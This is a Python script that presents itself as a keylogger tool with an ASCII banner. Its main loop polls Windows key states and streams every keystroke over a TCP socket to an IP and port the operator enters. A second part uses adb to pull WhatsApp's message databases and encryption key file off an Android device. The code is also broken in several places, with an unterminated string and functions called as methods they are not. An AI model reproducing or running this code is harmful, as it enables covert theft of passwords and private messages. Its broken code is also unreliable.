import ctypes
import json
import subprocess 
import socket
import time
import ipaddress
import os,sys
os.system("clear")
Logo = """\033[1;32m 
██╗  ██╗███████╗██╗   ██╗██╗      ██████╗  ██████╗  ██████╗ ███████╗██████╗ 
██║ ██╔╝██╔════╝╚██╗ ██╔╝██║     ██╔═══██╗██╔════╝ ██╔════╝ ██╔════╝██╔══██╗
█████╔╝ █████╗   ╚████╔╝ ██║     ██║   ██║██║  ███╗██║  ███╗█████╗  ██████╔╝
██╔═██╗ ██╔══╝    ╚██╔╝  ██║     ██║   ██║██║   ██║██║   ██║██╔══╝  ██╔══██╗
██║  ██╗███████╗   ██║   ███████╗╚██████╔╝╚██████╔╝╚██████╔╝███████╗██║  ██║
╚═╝  ╚═╝╚══════╝   ╚═╝   ╚══════╝ ╚═════╝  ╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝ ®
  coded by: Anonymous<Shadow> aka Jayden 
\033[1;91m"""
 
for char in Logo:
    sys.stdout.write(char)
    sys.stdout.flush()
    time.sleep(0.12)

print(Logo)

class SetPort:
    def __init__(self):
        self.port = None
        self.ip = None
        self.connect_to_device = ""

    def get_port_and_ip(self):
        os.system("clear")
        print(Logo)
        self.ip = input("Enter the IP address: ")
        self.port = int(input("Enter the port: "))

        try:
            ipaddress.ip_address(self.ip)
        except ValueError as e:
            for _ in range(3):
                print(f"{e} IP address invalid access the IP address.")

        return self.ip, self.port
#function to get readable key name from the ket code
def getKey(code):
    #ascii table for special an regular keys bruh
    asciiTable = {
        "0": "[NUL]", "1": "[LCLICK]", "2": "[RCLICK]", "3": "[ETX]", "4": "[SCROLLCLICK]",
        "5": "[ENQ]", "6": "[ACK]", "7": "[BEL]", "8": "[BACKSPACE]", "9": "[TAB]",
        "10": "[LF]", "11": "[VT]", "12": "[CLEAR]", "13": "[ENTER]", "14": "[SO]", "15": "[SI]",
        "16": "", "17": "[RALT]", "18": "[LALT]", "19": "[PAUSEBREAK]", "20": "[CAPSLOCK]",
        "21": "[NAK]", "22": "[SYN]", "23": "[ETB]", "24": "[CAN]", "25": "[EM]",
        "26": "[SUB]", "27": "[ESC]", "28": "[FS]", "29": "[GS]", "30": "[RS]",
        "31": "[US]", "32": "[SPACE]", "33": "[PAGEUP]", "34": "[PAGEDOWN]", "35": "[END]",
        "36": "[HOME]", "37": "[LEFT]", "38": "[UP]", "39": "[RIGHT]", "40": "[DOWN]",
        "41": ")", "42": "*", "43": "+", "44": "[PRTSC]", "45": "[INSERT]",
        "46": "[DELETE]", "47": "/", "48": "0", "49": "1", "50": "2",
        "51": "3", "52": "4", "53": "5", "54": "6", "55": "7",
        "56": "8", "57": "9", "58": ":", "59": ";", "60": "<",
        "61": "=", "62": ">", "63": "?", "64": "@", "65": "A",
        "66": "B", "67": "C", "68": "D", "69": "E", "70": "F",
        "71": "G", "72": "H", "73": "I", "74": "J", "75": "K",
        "76": "L", "77": "M", "78": "N", "79": "O", "80": "P",
        "81": "Q", "82": "R", "83": "S", "84": "T", "85": "U",
        "86": "V", "87": "W", "88": "X", "89": "Y", "90": "Z",
        "91": "[WIN]", "92": "\\", "93": "]", "94": "^", "95": "_",
        "96": "0", "97": "1", "98": "2", "99": "3", "100": "4",
        "101": "5", "102": "6", "103": "7", "104": "8", "105": "9",
        "106": "*", "107": "+", "108": "l", "109": "-", "110": ".",
        "111": "/", "112": "[F1]", "113": "[F2]", "114": "[F3]", "115": "[F4]",
        "116": "[F5]", "117": "[F6]", "118": "[F7]", "119": "[F8]", "120": "[F9]",
        "121": "[F10]", "122": "[F11]", "123": "[F12]", "124": "|", "125": "}",
        "126": "~", "145": "[SCROOLLOCK]", "144": "[NUMLOCK]", "160": "[LSHIFT]", "161": "[RSHIFT]",
        "162": "[LCTRL]", "163": "[RCTRL]", "190": ".", "191": "/", "188": ",",
        "186": ";", "189": "-", "187": "=", "165": "", "164": "",
        "192": "`", "222": "'", "220": "\\", "219": "[", "221": "]"
    }
    return asciiTable.get(str(code), "")

def main():
    set_port = SetPort()
    ip, port = set_port.get_port_and_ip()

    clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    clientSocket.connect((ip, port))

    user32 = ctypes.windll.user32
    keyStates = {}

    while True:
        for i in range(256):
            if user32.GetAsyncKeyState(i) & 0x8000 != 0:
                if keyStates.get(i, False) == False:
                    keyStates[i] = True
                    key = getKey(i)
                    if user32.GetKeyState(0x14) & 0x0001 == 0:
                        key = key.lower()
                    clientSocket.sendall(key.encode())
            else:
                keyStates[i] = False
        time.sleep(0.10)
        
# Connect to the Android device via ADB 
def connect_to_device(self):
    try:
        subprocess.run(["adb", "devices"], check=True)
    except subprocess.CalledProcessError as e:
        print(f"{e}Failed to connect to device")
        return ""

# Backup WhatsApp database files
def backup_whatsapp(self):
    if not connect_to_device():
        return backup_whatsapp()
    
    # Configure the destination path for backup
    dst_path = "/sdcard/whatsapp_backup"
    
    # Pull the WhatsApp databases from the device
    whatsapp_paths = [
        
        "/data/data/com.whatsapp/databases/msgstore.db",
        "/data/data/com.whatsapp/databases/wa.db",
        "/data/data/com.whatsapp/files/key"
        "
    ]
    
    for src_path in whatsapp_paths:
        subprocess.run([
            "adb", "pull", src_path, dst_path
        ], check=True)

if __name__ == "__main__":
    key = SetPort()
    key.get_port_and_ip()
    key.getkey()
    key.main()
    key.connect_to_devices()
    key.backup_whatsapp()